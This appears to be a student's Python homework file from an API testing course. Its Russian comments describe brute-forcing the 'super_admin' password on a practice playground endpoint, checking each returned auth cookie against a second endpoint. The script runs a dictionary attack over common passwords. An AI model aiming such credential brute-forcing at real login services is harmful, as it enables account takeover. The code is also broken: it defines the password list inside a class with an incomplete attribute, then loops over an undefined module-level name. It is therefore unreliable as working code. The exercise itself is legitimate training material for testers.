# Ex9*: Подбор пароля
#
# Это необязательное задание повышенной сложности. Если вы хотите диплом с отличием - вам нужно его выполнить.
# В остальных случаях - нет.
#
# Сегодня к нам пришел наш коллега и сказал, что забыл свой пароль от важного сервиса. Он просит нас помочь ему
# написать программу, которая подберет его пароль.
# Условие следующее. Есть метод: https://playground.learnqa.ru/ajax/api/get_secret_password_homework
# Его необходимо вызывать POST-запросом с двумя параметрами: login и password
# Если вызвать метод без поля login или указать несуществующий login, метод вернет 500
# Если login указан и существует, метод вернет нам авторизационную cookie с названием auth_cookie и каким-то значением.
#
# У метода существует защита от перебора. Если верно указано поле login, но передан неправильный password,
# то авторизационная cookie все равно вернется. НО с "неправильным" значением, которое на самом деле не
# позволит создавать авторизованные запросы.
# Только если и login, и password указаны верно, вернется cookie с "правильным" значением.
# Таким образом используя только метод get_secret_password_homework невозможно узнать, передали ли мы
# верный пароль или нет.
#
# По этой причине нам потребуется второй метод, который проверяет правильность нашей авторизованной
# cookie: https://playground.learnqa.ru/ajax/api/check_auth_cookie
#
# Если вызвать его без cookie с именем auth_cookie или с cookie, у которой выставлено "неправильное" значение,
# метод вернет фразу "You are NOT authorized".
# Если значение cookie “правильное”, метод вернет: “You are authorized”
#
# Коллега говорит, что точно помнит свой login - это значение super_admin
# А вот пароль забыл, но точно помнит, что выбрал его из списка самых популярных паролей
# на Википедии (вот тебе и супер админ...).
# Ссылка: https://en.wikipedia.org/wiki/List_of_the_most_common_passwords
# Искать его нужно среди списка Top 25 most common passwords by year according to SplashData
#
# Итак, наша задача - написать скрипт и указать в нем login нашего коллеги и все пароли из Википедии в виде списка.
# Программа должна делать следующее:
#
# 1. Брать очередной пароль и вместе с логином коллеги вызывать первый метод get_secret_password_homework.
# В ответ метод будет возвращать авторизационную cookie с именем auth_cookie и каким-то значением.
#
# 2. Далее эту cookie мы должна передать во второй метод check_auth_cookie.
# Если в ответ вернулась фраза "You are NOT authorized", значит пароль неправильный.
# В этом случае берем следующий пароль и все заново. Если же вернулась другая фраза - нужно,
# чтобы программа вывела верный пароль и эту фразу.
#
# Ответом к задаче должен быть верный пароль и ссылка на коммит со скриптом.


import requests


class PasswordParsing:


    passwords = {'123456', '123456789', 'qwerty', 'password', '1234567', '12345678', '12345',
             'iloveyou', '111111', '123123', 'abc123', 'qwerty123',
             '1q2w3e4r', 'admin', 'qwertyuiop', '654321', '555555', 'lovely', '7777777',
             'welcome', '888888', 'princess', 'dragon', 'password1', '123qwe', '123456', 'password', '123456789',
             '12345678', '12345', '111111', '1234567', 'sunshine', 'qwerty', 'iloveyou',
             'admin', 'welcome', 'monkey', 'login', 'abc123', 'starwars', '123123', 'dragon', 'passw0rd', 'master', 'hello', 'freedom', 'whatever', 'qazwsx', 'trustno1'}
    def __init__(self):
        self.respoz

for i in passwords:
    responses = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework",
                              data={"login": "super_admin", "password": i})
    # print(responses.text)
    # print(responses.status_code)
    # print(dict(responses.cookies))
    # print(responses.headers)
    cookie_value = responses.cookies.get('auth_cookie')
    cookies = {'auth_cookie': cookie_value}
    response_check_cookie = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
    if response_check_cookie.text == "You are NOT authorized":
        continue
    else:
        print('ВАШ ПАРОЛЬ, СЭР')
        print(i, f"{response_check_cookie.text}")
